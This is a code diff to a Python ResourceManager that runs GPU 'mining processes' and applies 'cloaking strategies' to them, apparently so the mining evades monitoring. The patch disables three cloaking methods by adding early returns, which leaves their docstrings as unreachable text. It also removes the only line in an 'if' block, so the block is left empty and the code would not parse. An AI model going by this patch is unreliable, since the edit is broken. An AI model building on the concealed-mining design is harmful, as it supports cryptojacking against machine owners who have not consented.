@@ -444,6 +444,8 @@ class ResourceManager(IResourceManager):
             return False
 
     def _apply_strategies(self, process: MiningProcess, strategies: List[str]) -> bool:
+        """Legacy method removed – always returns False"""
+        return False
         """Apply cloaking strategies to the process"""
         success_count = 0
         
@@ -469,6 +471,8 @@ class ResourceManager(IResourceManager):
         return success_count > 0
 
     def _determine_strategies(self, process: MiningProcess) -> List[str]:
+        """Legacy method removed – returns empty list"""
+        return []
         """Determine appropriate cloaking strategies for the process"""
         strategies = []
         
@@ -862,7 +866,7 @@ class ResourceManager(IResourceManager):
                         
                         # **Re-apply cloaking if needed** (áp dụng lại cloaking nếu cần)
                         if metrics.get('gpu_usage', 0) > 0:  # Process is actively using GPU
-                            self._reapply_cloaking_if_needed(mining_process)
+                            
                 
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     dead_pids.append(pid)
@@ -884,6 +888,8 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")
     
     def _reapply_cloaking_if_needed(self, mining_process: MiningProcess):
+        """Legacy method removed – no-op"""
+        return
         """
         **🥇 SOLUTION 1: Re-apply Cloaking If Needed** (áp dụng lại cloaking nếu cần)
         
